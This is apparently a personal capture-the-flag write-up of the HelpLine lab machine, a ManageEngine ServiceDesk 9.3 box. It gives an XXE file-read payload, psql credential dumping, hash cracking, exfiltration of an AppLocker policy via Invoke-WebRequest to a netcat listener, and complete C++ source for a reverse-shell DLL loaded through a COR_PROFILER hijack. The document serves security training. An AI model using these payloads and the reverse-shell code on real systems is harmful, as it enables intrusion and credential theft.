+++

title="HelpLine-Gold"

+++

This box was allot of fun it was created by @egr355. The webpage is running service engine(manage engine). That uses default credentials there are some clues in the there that are obscure and kind of hidden. I initially missed that and used [FlameOfIgnis](https://chickenpwny.github.io/images/helpline/http://flameofignis.com/2019/03/30/ServiceDesk-9-3-Auth-Bypass-CVE-2019-10008/ ) exploit that will elevate a user to any known username. using some form of  php type juggling. That's not needed, Find some credentials inside a excel file that hides the passwords. Well use the credentials to login into smb and find some more credentials that will lead to a shell as alice. 

Enumating applocker & awhole bunch of other stuff. there are extra drives, well find where manage engine is hosted. and use psql to find saved credentials. thanks to password reuse well be able to login as tolu. gain even more permissions to the E: drive. well find the backup script used maintain the webapp. the script takes input form a file then backups up the file listed. it uses invoke expressions, well use that to get command injection. gain a nishang shell as leo, leo well find a powershell secure string. well do some powerfoo and decrypt the string into a plaintext. 

login as adminsitrator to gain root.

![Yugi_and_co._looking_for_the_true_door](https://chickenpwny.github.io/images/helpline/Yugi_and_co._looking_for_the_true_door.png)

```
nmap -sT -Pn -p- -T5 --min-rate=10000 10.10.10.132                                               
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-31 18:12 EDT
Nmap scan report for HELPLINE (10.10.10.132)
Host is up (0.056s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
8080/tcp  open  http-proxy
```



**WebPage** *ManageEngine9.3*

Manage Engines Default Credentials are Guest & Guest. 

![mangine-engine](https://chickenpwny.github.io/images/helpline/mangine-engine.PNG)

Once, logged in you will notice there isn't allot gong on. This led me to do some research on cve's and ways to exploit version 9.3. there are a bunch of great tricks i covered in my notes. Navigating to the solutions page was written by luis ribeiro. A real user, so this is a clue. youll notice only one of the solutions has an attachment. 

![mangine-engine2](https://chickenpwny.github.io/images/helpline/mangine-engine2.PNG)

![mangine-engine3](https://chickenpwny.github.io/images/helpline/mangine-engine3.PNG)

**PassWordAudit**

Found a excelsheet. i installed [openoffice](https://chickenpwny.github.io/images/helpline/https://www.openoffice.org/) to view the <mark>.xlsx</mark> file. The initial finding are underwhelming but some content has been hidden. Go to format > select sheet > show. this will show all hidden sheets. Which will reveal some more notes. We find usernames, passwords. it also reveals some of the finer details privileges which accounts share the same password. Also what systems are associated with the passwords. we become aware of a directory it_logins.txt

![pass-audit](https://chickenpwny.github.io/images/helpline/pass-audit.PNG)

![pass-audit2](https://chickenpwny.github.io/images/helpline/pass-audit2.PNG)

<mark>The recent penetration test revealed some accounts with weak password security, probably there are more.   We should also consider something that can automate account discovery.Please update this document with any accounts/logins which you suspect have weak / easily guessable passwords. </mark>

| oracle                | scott         | tiger        | priv |
| --------------------- | ------------- | ------------ | ---- |
| wordpresshydra        | admin         | megabank1    | priv |
| windows 7 local admin | Administrator | Megabank123! |      |
| MFT download          | clients       | megabank1    |      |
| jump box              | gavin         |              | priv |

The biggest clue of all was. <mark>File containing details from subsequent audit saved to C:\Temp\Password Audit\it_logins.txt on HELPLINE</mark>

If you go to my notes there are some interesting things about how to enumerate users with wfuzz & burp. 

**XXE -	Stand for XML External Entity traversal **

an xxe attack takes advantage of how an application parses xml input. since the webserver will return the output of the xml file. Xml  entity allows us to read files on the system/disk. The header creates a external entity thats using a system call and assigns it to the variable in the xml file. printing the contenets of any file on the system.  

The first reference will help understand the different elements of xxe vuln. the second provice a proof of concept script that verifies this vuln works. It help understand what was needed and what was not. The last was the most helpful but getting it to work was tricky 

```
	### references ###
```

- https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/
- https://github.com/devcoinfet/Manage-Engine-9.3-xxe-/commit/624ca1cdcc126a5396e652aebedbf3a85256d058
- https://labs.integrity.pt/advisories/cve-2017-9362/index.html

Below is the first valid response that wasn't a 3002 or 3026 xml errors. foo & file are variables that can b arbitrarily replace, except file:///. also the order matters in the labs.integrity didn't add the xml version part. To get it to work on this system need to add the api version. then incert the variable in value.

i used cyber-chef to url-encode the strings. burp just does a whacky lame job of encoding in my opinion.  crt+u then crtl + u it will encode the + to %2b instead of %20

```
OPERATION_NAME=add&INPUT_DATA=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY file SYSTEM "file:///C:\Temp\Password Audit\it_logins.txt">]>
<API version='1.0' locale='en'>
<value>&file;</value>
</API>
```

without the xml version it will give a xml error. 

![xxe2](https://chickenpwny.github.io/images/helpline/xxe2.PNG)

![xxe3](https://chickenpwny.github.io/images/helpline/xxe3.PNG)

This produced the desired output. in the next section i played around with how much i need to get the same output. 

```
liOPERATION_NAME=add&INPUT_DATA=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY file SYSTEM "file:///C:\Temp\Password Audit\it_logins.txt">]>
<API version='1.0' locale='en'>
<records>
        <record>
            <parameter>
                <name>CI Name</name>
                <value>Tomcat Server 3&file;</value>
            </parameter>
            <parameter>
                <name>CI Type</name>
                <value>Business Service</value>
            </parameter>
            <parameter>
                <name>Site</name>
                <value>(empty)</value>
            </parameter>
            <parameter>
                <name>Business Impact</name>
                <value>High</value>
            </parameter>
            <parameter>
                <name>Description</name>
                <value>Domain Conroller </value>
            </parameter>
            <parameter>
                <name>Availability Target(%)</name>
                <value>200</value>
            </parameter>
            <parameter>
                <name>Service Support Hours</name>
                <value>24X5</value>
            </parameter>
            <parameter>
                <name>Cost</name>
                <value>8080</value>
            </parameter>
            <parameter>
                <name>Incident restoration target</name>
                <value>90%</value>
            </parameter>
        </record>
    </records>
</API>
```

So most of the stuff is just fluff and not necessary to get it run.

```
OPERATION_NAME=add&INPUT_DATA=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY pie SYSTEM "file:///C:\Temp\Password Audit\it_logins.txt">]>
<API version='1.0' locale='en'>
<records>
        <record>
            <parameter>
                <name>pinkie</name>
                <value>&pie;</value>
            </parameter>
        </record>
    </records>
</API>
```

![xxe](https://chickenpwny.github.io/images/helpline/C:\Users\charl\OneDrive\Pictures\hackthebox\helpline\xxe.PNG)

Somehow i cleaned up the output.  We got alice's password but for what and how do we use it? I checked the creds against smb & the website. These are user credentials and port 5985. 

```
{"API":{"locale":"en","version":"1.0","response":{"operation":{"name":"add","result":{"statuscode":"3016","status":"Unable to perform the requested operation.","message":"Unable to add the CI(s), please refer the error message.","created-date":"Jun 8, 2019 01:27 AM"},"Details":{"records":{"failed":["1",{"ci":{"name":"Tomcat Server 3\r\nlocal Windows account created\r\n\r\nusername: alice\r\npassword: $sys4ops@megabank!\r\nadmin required: no\r\n\r\nshadow admin accounts:\r\n\r\nmike_adm:Password1\r\ndr_acc:dr_acc","error":"\'Product Name\' cannot be empty."}}],"success":"0","total":"1"}}}}}}
```

```
admin required: no pass
user:	alice | pass:	 $sys4ops@megabank!
shadow admin acounts below
user:	mike_adm | pass:	Password1
dr_ass 	dr_ass
```

**SHELL 		##### ALICE ##### pass:$sys4ops@megabank!**

setup winrm, do some enumeration, find out this boxes sucks really quickly clm, applocker & av that seems to pick up everything. We find the E:\ drive gain some creds from psql. 

Download, [winrm.rb](https://chickenpwny.github.io/images/helpline/https://github.com/WinRb/WinRM) make it look like the below picture. i would recommend reading the winrm github repot. 

![winrm](https://chickenpwny.github.io/images/helpline/winrm.PNG)

Here are a list of commands i ran to enumerate the user. *READ MY NOTES* for more details on the different commands ran. 

```
whoami /priv #nothing
systeminfo # denied
$ExecutionContext.SessionState.Languagemode #constrainted language mode
netstat -ant or pant #8081 was odd but never checked it out
```

Once i run i check for clm is i am in a constrained language mode i will check the available versions of powershell. this is a easy way to see if version two is available. you can use different bypasses depending on the version. I also use to check it by the directory. 

```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
dir C:\Windows\Microsoft.NET\Framework\
```

![clm](https://chickenpwny.github.io/images/helpline/clm.PNG)

*Enumerating Drives on windows*

I recently did ethereal and remember that 0xdf used a command to enumerate possible drives. I never investigated the d: drive not really sure if its anything. 

```
fsutil fsinfo drives
```

![drives](https://chickenpwny.github.io/images/helpline/drives.PNG)

**PSQL**

**E:** The ManageEngine pgsql. Luckily I did flujab recently following ippsec and 0xdf guides.  I'm slowly getting better at sql tables. ManageEngine uses pgsql(psql) to run the site, it took quite of bit of time to find the directory for pgsql i must have gleamed over it or it was changed. 

Below is the path to psql.exe well use this to interact witht the sql server it is using default credentials. There are a bunch of other cool things in the pgsql\bin directory. 

```
cd E:\ManageEngine\ServiceDesk\pgsql\bin
```

From the root directory you there is another bin's folder that has changeDBServer.bat this file will give you the necessary information to login into the console. there is a cool exploit if i had the ability to write to these files. below is a example of editing one of the files during start up to elevate our session.

```
ChangeJRE.bat
start "" "C:\ManageEngine\ADManger Plus\bin\privesc.exe"
```

Minatotw gave my a hint to mess with the pgsql. The below bit will dump all the tables. here well find a bunch of useful information. We could enumerate the whole website from here gaining all the information need about the target company. Services usernames passwords. im sure the credentials are reused. The below command generated two interesting tables aaauser aaapassword, i believe these naming conventions are quite common. i have used the triple a's before.

I reused the sql from flujab to enumerate the webapp. 

```
.\psql.exe -h 127.0.0.1 -U postgres -p 65432 -d servicedesk -c "select 1,2,CONCAT(TABLE_SCHEMA,':',TABLE_NAME),4,5 from INFORMATION_SCHEMA.COLUMNS"
-h host
-U username
-d name of the database
-c command line
```

```
aaauser
aaapassword
```

![sql-password (2)https://chickenpwny.github.io/images/helpline/sql-password (2).PNG)

cd into <mark>E:\manageengine\servicedesk\pgsql\bin</mark> then run the command for aaapasssword. 

```
.\psql.exe -h 127.0.0.1 -p 65432 -U postgres -d servicedesk -c "select * from aaauser"
.\psql.exe -h 127.0.0.1 -p 65432 -U postgres -d servicedesk -c "select * from aaapassword"
```

![sql-password3](https://chickenpwny.github.io/images/helpline/sql-password3.PNG)

Put all the strings into a file like beylow. then move it over to where ever you crack the passwords. i move everything to my host to crack. the [hashcat](https://chickenpwny.github.io/images/helpline/https://hashcat.net/wiki/doku.php?id=example_hashes) hash example page is always a good reference. 

```
hashcat -m 3200 hash-helpline.txt rockyou.txt
```

```
userlicenseusageinfo
$sys4ops@megabank!
1234567890
1q2w3e4r
0987654321
guest
```

The winner is <mark>0987654321</mark>

**WEVTUTIL.EXE** EVENT LOGS

Figuring out how to use these creds was such a pain but checking localgroup policy really helped. It revealed the zachery has the ability to read event logs on the system. Using <mark>wevutil.exe</mark> to check out all the security logs.

```
c:\windows\system32\wevtutil.exe el /r:helpline /u:helpline\zachary /p:0987654321
el ENUMERATE EVENT LOG NAMES
/u USERNAME
/p PASSWORD
/r REMOTE COMPUTER NAME
```

  You'll notice the file  is rather large using invoke web-request post method to move the file is an option. i had some issue using grep to find the string. also saving the security logs in a xml format and moving them over then using firefox to view the logs is an option. I found the simplest solution is pipping it over to FINDSTR  is the windows equivalent of grep. 

https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil

```
c:\windows\system32\wevtutil.exe qe Security /r:helpline /u:helpline\zachary /p:0987654321 /f:text /rd:true | findstr tolu
/qe querry
/f format text, xml
/rd direction true most recent false oldest.
```

![toluhttps://chickenpwny.github.io/images/helpline/tolu.PNG)

## **TOLU**

!zaq1234567890pl!99

  Go to the E: drive, Tolu has more privilege than alice. so we gain more access in the E drive. we gain access to scripts, inside the scripts directory a folder a powershell script and a text file. Im going to spend a bit of time talk about the script has it's the beginning to the end. 

The script changes directories, then proceeds to clean up past attempts by using <mark>Remove-Item.</mark> Run's <mark> NetStat</mark>  checks the ports running, checks the api status. Uploads something to locally to the webserver. Not really sure what thats about because perhaps moving the file for some reason. does some more checks. 

For more detail about the script go the notes. From now on well be focusing on the filter & invoke-expression. When the script sanitizes user input it about covers every character and finding escape characters was a challenge. 

**BLACKLISTED**

```
space
dll
exe
scripts:cmd,ps1,bat
&
}
{
/
\
""
\ <<=== the single quote is used as an escape. 
'
)
(
.
```

**APPLOCKER**

Checking applocker is import an important part of windows enumeration. Command line tool to get the policy is  <mark>Get-AppLockerPolicy</mark> output to a file to a xml format.  Applocker rule enforcement is applied to a collection of rules. there should be minimum of four rule collections installers, executable, Dll, & Scripts

 Move the file over using invoke-webrequest post method. we'll have to remove the header when it's sent over. setup a *NetCat* listener i like to use the verbose switch so i know if it connects etc. you will have to close the listener to close out everything, just check the bytes to know it's completely finished uploading.

```
Get-AppLockerPolicy -Effective -XML > meow.xml

Invoke-WebRequest -Uri http://10.10.15.57 -Proxy 'http://10.10.15.57:80' -Method Post -InFile meow.xml

nc -lvp 80 > meow.xml
```

![invoke-post-applocker2](https://chickenpwny.github.io/images/helpline/invoke-post-applocker2.PNG)

Once the xml file is moved over open the file with a browser. Well noticed there are five rules as mentioned above, were allowed to run DLL'S and scripts in e:\scripts.

![invoke-post-applocker4](https://chickenpwny.github.io/images/helpline/invoke-post-applocker4.PNG)

![invoke-post-applocker3](https://chickenpwny.github.io/images/helpline/invoke-post-applocker3.PNG)

**Invoke-Expression** 

So to test this out I made a smaller version of the script locally to testout. there are some key difference, i don't have another user account runnig the script. so that affected the output. 

PLEASE GO TO THE NOTES FOR MORE DETAILS. 

*Assembling the DLL*

There are there parts to a dll when it comes to compiling them  dllmain.cpp the payload revshell.cpp and a header file rev_shell.h. i  tried compiling this in visual studios, i also tried the msfvenom build  dlls. Defender Laughs.

**dllmain.cpp** I tried awhole host of  different dllmains this is the one i got to work. it calls in the header  section revshell.h, DLL_PROCESS cal the revshell and assembles our  payload.

```
#include "rev_shell.h"
#include <windows.h>
#include <stdio.h>

BOOL WINAPI DllMain( HINSTANCE hinstDLL,
                        DWORD fwdReason,
                        LPVOID lpReservered)
{
        switch (fwdReason)
        {
        case DLL_PROCESS_ATTACH:
                rev_shell();
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
                break;
        }
        return TRUE;
}
```

**revshell.cpp** CHANGE THE REMOTE_PORT AND REMOTE_ADDR

```
#include <stdio.h>                                                                               
#include <string.h>
#include <process.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

#define REMOTE_ADDR "10.10.14.2"
#define REMOTE_PORT "9135"

void rev_shell()
{
        FreeConsole();

        WSADATA wsaData;
        int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
        struct addrinfo *result = NULL, *ptr = NULL, hints;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;
        getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &hints, &result);
        ptr = result;
        SOCKET ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);                                              
        connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        si.hStdInput = (HANDLE)ConnectSocket;
        si.hStdOutput = (HANDLE)ConnectSocket;
        si.hStdError = (HANDLE)ConnectSocket;
        TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
        CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
	    WSACleanup();
}
```

**rev_shell.h**

```
#pragma Once

void rev_shell();
```

**Compiling the DLL** -

<https://egre55.github.io/system-properties-uac-bypass/>

<https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/>

Firstly install mingw there are a bunch of version you want, no need them all. apt-get install mingw* 

```
x86_64-w64-mingw32-gcc -shared -o death-piex86.dll dllmain.cpp revshell.cpp rev_shel
```

**Cor Profiler BYPASS**

I got pretty close using some other methods mentioned in my notes. Using Enviromental  variable that are global for all users. i was able to call  <mark> .\l.cmd </mark> which used the cor profile bypass to get a shell as leo. You may call a nishang shell or a meterpreter shell. creating the dll it pretty straight forward. 

```
set "COR_ENABLE_PROFILING=1"
set "COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}"
set "COR_PROFILER_PATH=c:\windows\system32\drivers\spool\color\revshell.dll"
tzsync
```

set up the listener if us used nishang netcat meterpreter use multi/handler. All we have to do is sit back and wait for 5 minutes. 

**LEO**

The mysterious string, is it base encoded? what what is it? This is a powershell Secure string. XD doesn't exactly look like a base64 encoded string the letter's are lowercase characters. You cannot move the secure string off the system and decrypt it. 

```
01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f2fefa98a0d84f4b917dd8a1f5889c8100000000020000000000106600000001000020000000c2d2dd6646fb78feb6f7920ed36b0ade40efeaec6b090556fe6efb52a7e847cc000000000e8000000002000020000000c41d656142bd869ea7eeae22fc00f0f707ebd676a7f5fe04a0d0932dffac3f48300000006cbf505e52b6e132a07de261042bcdca80d0d12ce7e8e60022ff8d9bc042a437a1c49aa0c7943c58e802d1c758fc5dd340000000c4a81c4415883f937970216c5d91acbf80def08ad70a02b061ec88c9bb4ecd14301828044fefc3415f5e128cfb389cbe8968feb8785914070e8aebd6504afcaa
```

```
 Enter-PSSession -ComputerName helpline.htb -Credential administrator -authentication credssp
```

![passwords](https://chickenpwny.github.io/images/helpline/passwords.PNG)

login using winrm user administrator, password mb@letmein@SERVER#acc